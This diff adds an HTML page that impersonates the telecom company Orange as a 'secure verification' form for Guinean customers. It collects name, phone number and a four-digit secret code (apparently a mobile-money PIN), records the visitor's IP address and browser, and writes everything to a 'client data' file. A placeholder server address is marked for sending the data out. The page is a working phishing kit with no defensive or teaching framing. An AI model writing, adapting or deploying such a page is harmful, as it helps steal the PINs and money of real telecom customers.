@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Formulaire de vérification Orange">
+    <title>Orange - Vérification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff6600 0%, #ff983d 100%);
+            color: #333;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            margin: 20px 0;
+        }
+        
+        .orange-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .orange-header h1 {
+            color: #FFFFFF;
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .orange-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 32px;
+            font-weight: bold;
+            color: #FFFFFF;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .orange-logo-circle {
+            width: 50px;
+            height: 50px;
+            background: #FFFFFF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #FF6600;
+            font-weight: bold;
+            font-size: 24px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #444;
+        }
+        
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="tel"]:focus {
+            border-color: #FF6600;
+            outline: none;
+        }
+        
+        .btn {
+            background-color: #FF6600;
+            color: white;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background-color: #e65c00;
+        }
+        
+        .btn:active {
+            transform: translateY(2px);
+        }
+        
+        .code-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .code-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #333;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .code-input {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 28px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            background: #f9f9f9;
+        }
+        
+        .code-input:focus {
+            border-color: #FF6600;
+            outline: none;
+            box-shadow: 0 0 5px rgba(255, 102, 0, 0.5);
+        }
+        
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .numpad-btn {
+            padding: 18px;
+            font-size: 26px;
+            background: #f1f3f4;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        
+        .numpad-btn:hover {
+            background: #e0e0e0;
+            transform: translateY(-2px);
+        }
+        
+        .numpad-btn:active {
+            transform: translateY(0);
+        }
+        
+        .validate-btn {
+            background-color: #FF6600;
+            color: white;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        
+        .validate-btn:hover {
+            background-color: #e65c00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .info-text {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .required {
+            color: #FF6600;
+        }
+        
+        .footer {
+            text-align: center;
+            color: white;
+            margin-top: 20px;
+            font-size: 14px;
+            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 15px;
+            background: #d4edda;
+            color: #155724;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .admin-info {
+            margin-top: 30px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #FF6600;
+        }
+        
+        @media (max-width: 500px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .code-input {
+                width: 50px;
+                height: 60px;
+                font-size: 24px;
+            }
+            
+            .numpad-btn {
+                padding: 15px;
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="orange-header">
+        <div class="orange-logo">
+            <div class="orange-logo-circle">O</div>
+            <span>Orange</span>
+        </div>
+        <h1>Espace de Vérification Sécurisée</h1>
+    </div>
+
+    <!-- Première page - Formulaire d'informations -->
+    <div id="info-page" class="container">
+        <p class="info-text">Veuillez saisir vos informations personnelles pour continuer</p>
+        
+        <form id="user-info-form">
+            <div class="form-group">
+                <label for="lastname">Nom <span class="required">*</span></label>
+                <input type="text" id="lastname" name="lastname" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="firstname">Prénom <span class="required">*</span></label>
+                <input type="text" id="firstname" name="firstname" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Numéro de téléphone (Guinée) <span class="required">*</span></label>
+                <input type="tel" id="phone" name="phone" placeholder="+224 XXX XXX XXX" required>
+                <small style="color: #666;">Format: +224 XXX XXX XXX</small>
+            </div>
+            
+            <button type="submit" class="btn">Continuer</button>
+        </form>
+        
+        <div class="admin-info">
+            <h3>Information Administrateur</h3>
+            <p>Les données sont automatiquement enregistrées sur notre serveur sécurisé après validation.</p>
+        </div>
+    </div>
+
+    <!-- Deuxième page - Code secret (cachée initialement) -->
+    <div id="code-page" class="container hidden">
+        <h2 class="code-title">Entrez votre code secret</h2>
+        
+        <div class="code-inputs">
+            <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+            <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+            <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+            <input type="password" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+        </div>
+        
+        <div class="numpad">
+            <button type="button" class="numpad-btn" onclick="pressDigit(1)">1</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(2)">2</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(3)">3</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(4)">4</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(5)">5</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(6)">6</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(7)">7</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(8)">8</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(9)">9</button>
+            <button type="button" class="numpad-btn" onclick="pressDigit(0)">0</button>
+        </div>
+        
+        <button type="button" class="validate-btn" onclick="validateCode()">Valider</button>
+        
+        <div id="success-message" class="success-message hidden">
+            Vérification terminée avec succès!
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2025 Orange - Tous droits réservés
+    </div>
+
+    <script>
+        // Variables globales
+        let userData = {};
+        
+        // Fonction pour passer au champ suivant
+        function moveToNext(field, nextIndex) {
+            if (field.value.length >= 1) {
+                const inputs = document.querySelectorAll('.code-input');
+                if (nextIndex < inputs.length) {
+                    inputs[nextIndex].focus();
+                }
+            }
+        }
+        
+        // Fonction pour appuyer sur un chiffre
+        function pressDigit(digit) {
+            const inputs = document.querySelectorAll('.code-input');
+            for (let i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value) {
+                    inputs[i].value = digit;
+                    if (i < inputs.length - 1) {
+                        inputs[i+1].focus();
+                    }
+                    break;
+                }
+            }
+        }
+        
+        // Fonction pour valider le code
+        function validateCode() {
+            const inputs = document.querySelectorAll('.code-input');
+            let code = '';
+            let allFilled = true;
+            
+            for (let i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value) {
+                    allFilled = false;
+                    break;
+                }
+                code += inputs[i].value;
+            }
+            
+            if (!allFilled) {
+                alert('Veuillez saisir un code complet à 4 chiffres.');
+                return;
+            }
+            
+            // Ajouter le code aux données utilisateur
+            userData.code = code;
+            userData.verificationDate = new Date().toLocaleString();
+            userData.ip = "En cours de collecte...";
+            
+            // Enregistrer les données sur le serveur
+            saveDataToServer();
+            
+            // Afficher le message de succès
+            document.getElementById('success-message').classList.remove('hidden');
+            
+            // Réinitialiser après 3 secondes
+            setTimeout(() => {
+                document.getElementById('success-message').classList.add('hidden');
+                resetForms();
+                document.getElementById('code-page').classList.add('hidden');
+                document.getElementById('info-page').classList.remove('hidden');
+            }, 3000);
+        }
+        
+        // Fonction pour enregistrer les données sur le serveur
+        function saveDataToServer() {
+            // Récupérer l'adresse IP de l'utilisateur
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userData.ip = data.ip;
+                    userData.userAgent = navigator.userAgent;
+                    
+                    // Envoyer les données au serveur (à remplacer par votre endpoint)
+                    const serverURL = 'https://votre-serveur.com/api/save-data';
+                    
+                    // Simulation d'envoi (à remplacer par un vrai appel API)
+                    console.log('Données envoyées au serveur:', userData);
+                    
+                    // Télécharger également un fichier local
+                    saveLocalFile();
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération de l\'IP:', error);
+                    // Envoyer les données même sans IP
+                    saveLocalFile();
+                });
+        }
+        
+        // Fonction pour enregistrer les données dans un fichier local
+        function saveLocalFile() {
+            // Formatage des données
+            const data = `===== ORANGE - DONNÉES CLIENT =====
+Date: ${userData.verificationDate}
+Nom: ${userData.lastname}
+Prénom: ${userData.firstname}
+Téléphone: ${userData.phone}
+Code secret: ${userData.code}
+Adresse IP: ${userData.ip}
+User Agent: ${userData.userAgent}
+====================================
+`;
+            
+            // Créer un blob avec les données
+            const blob = new Blob([data], { type: 'text/plain' });
+            
+            // Créer un lien de téléchargement
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `orange_data_${userData.lastname}_${userData.firstname}.txt`;
+            
+            // Ajouter le lien au document et cliquer dessus
+            document.body.appendChild(a);
+            a.click();
+            
+            // Nettoyer
+            document.body.removeChild(a);
+            URL.revokeObjectURL(a.href);
+            
+            console.log('Données enregistrées:', userData);
+        }
+        
+        // Fonction pour réinitialiser les formulaires
+        function resetForms() {
+            document.getElementById('user-info-form').reset();
+            const inputs = document.querySelectorAll('.code-input');
+            inputs.forEach(input => input.value = '');
+        }
+        
+        // Gestion de la soumission du formulaire
+        document.getElementById('user-info-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const lastname = document.getElementById('lastname').value;
+            const firstname = document.getElementById('firstname').value;
+            const phone = document.getElementById('phone').value;
+            
+            // Validation du numéro de téléphone Guinéen
+            if (!isValidGuineanPhone(phone)) {
+                alert('Veuillez entrer un numéro de téléphone guinéen valide (ex: +224 XXX XXX XXX).');
+                return;
+            }
+            
+            // Stocker les données utilisateur
+            userData = {
+                lastname: lastname,
+                firstname: firstname,
+                phone: phone
+            };
+            
+            // Passage à la page suivante
+            document.getElementById('info-page').classList.add('hidden');
+            document.getElementById('code-page').classList.remove('hidden');
+        });
+        
+        // Fonction de validation du numéro de téléphone guinéen
+        function isValidGuineanPhone(phone) {
+            const regex = /^(\+224|00224)[0-9]{9}$/;
+            return regex.test(phone.replace(/\s/g, ''));
+        }
+        
+        // Permettre la navigation avec les flèches du clavier
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.code-input');
+            
+            inputs.forEach((input, index) => {
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        inputs[index - 1].focus();
+                    } else if (e.key === 'ArrowRight' && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    } else if (e.key === 'Backspace' && !this.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
